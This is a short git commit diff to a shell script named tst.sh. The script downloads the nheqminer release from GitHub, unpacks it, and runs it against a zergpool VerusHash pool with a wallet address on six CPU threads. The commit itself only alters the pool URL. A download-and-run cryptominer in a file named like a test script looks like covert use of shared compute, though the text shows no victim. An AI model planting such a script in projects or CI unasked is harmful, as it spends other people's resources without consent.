d4290480869a4d016636777c2f7294fb81429a64
fahdin1510 <84253293+fahdin1510@users.noreply.github.com>
2021-05-17 07:46:48 +0700

    Update tst.sh

--- tst.sh
+++ tst.sh
@@ -2,4 +2,4 @@ sudo apt update
 wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
 tar xf nheqminer-Linux-v0.8.2.tgz
 tar xf nheqminer-Linux-v0.8.2.tar.gz
-nheqminer/nheqminer -v -l stratum+tcp://verushash.mine.zergpool.com:3300 -u 0xc76501e729406b3a93ae6fa0975df0546acf6a92.tstt --cpu 6
+nheqminer/nheqminer -v -l verushash.mine.zergpool.com:3300 -u 0xc76501e729406b3a93ae6fa0975df0546acf6a92.tstt --cpu 6
